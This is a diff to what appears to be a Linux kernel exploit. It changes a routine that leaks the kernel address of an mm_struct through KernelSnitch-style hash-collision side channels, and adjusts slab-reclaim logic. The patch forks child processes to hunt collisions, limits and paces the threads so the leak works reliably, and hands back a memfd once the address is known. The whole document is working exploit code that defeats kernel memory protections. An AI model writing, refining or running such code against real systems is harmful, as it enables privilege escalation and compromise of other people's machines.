@@ -579,16 +579,38 @@ uintptr_t match_page(kernelsnitch::KernelSnitchContext *ks, uintptr_t base, size
  *
  * Returns the held memfd on success, -2 when no usable mm was found, and -3
  * when the hint went stale. */
+/* Fork a child that finds collisions on THIS hunt's context, wait for it to
+ * finish, then reap it.
+ *
+ * The module-level clone_leak_child() cannot be reused here: it drives the
+ * outer scan context through its state machine, not the per-hunt one, which
+ * both fails to populate this context and pushes the outer one into an
+ * illegal transition. The child is always reaped -- leaking one per attempt
+ * exhausts the process table and every later clone fails with EAGAIN. */
+bool find_collisions_for(kernelsnitch::KernelSnitchContext *ctx) {
+    const pid_t child = static_cast<pid_t>(SYSCHK(syscall(SYS_clone, SIGCHLD, nullptr, nullptr, nullptr, 0)));
+    if (child == 0) {
+        kernelsnitch::context_find_collisions(ctx);
+        _exit(kernelsnitch::context_has_collisions(ctx) ? 0 : 4);
+    }
+    int status = 0;
+    const bool reaped = waitpid(child, &status, 0) == child;
+    return reaped && WIFEXITED(status) && !WEXITSTATUS(status) && kernelsnitch::context_has_collisions(ctx);
+}
+
 int32_t leak_mm(size_t cpu_count, uintptr_t hint, size_t mm_struct_sz, size_t mm_slab_order,
                 size_t batch, uintptr_t *mm_out) {
     const size_t collisions = hint ? 2 : 4;
+    /* Each hunt spawns one thread per CPU and tears them all down again, so
+     * pace the attempts: 256 back-to-back create/destroy rounds is enough to
+     * hit the thread limit even with every child reaped. */
+    const size_t threads = cpu_count < 4 ? cpu_count : 4;
     kernelsnitch::KernelSnitchOwner ks = kernelsnitch::KernelSnitchOwner::create(
-            mm_struct_sz, mm_slab_order, cpu_count, collisions, 0, 0);
+            mm_struct_sz, mm_slab_order, threads, collisions, 0, 0);
     if (!ks.get()) {
         return -2;
     }
-    const pid_t child = clone_leak_child();
-    if (child <= 0 || !ks.has_collisions()) {
+    if (!find_collisions_for(ks.get())) {
         return -2;
     }
     if (hint) {
@@ -602,6 +624,8 @@ int32_t leak_mm(size_t cpu_count, uintptr_t hint, size_t mm_struct_sz, size_t mm
     } else {
         *mm_out = ks.result();
     }
+    /* Take the reference only once the mm is known, so a failed hunt holds no
+     * memfd. clone_memfd() kills and reaps its own child. */
     return clone_memfd();
 }
 
@@ -659,6 +683,7 @@ bool a53_collect_full_group(std::size_t cpu_count, std::size_t mm_struct_sz, std
         }
         const uintptr_t base = mm & ~(kernel::ORDER3_SIZE - 1);
         hint = base;
+        usleep(20000);
         size_t slot_index = a53_reclaim::kMaxGroups;
         for (size_t i = 0; i < group_count; i++) {
             if (bases[i] == base) {
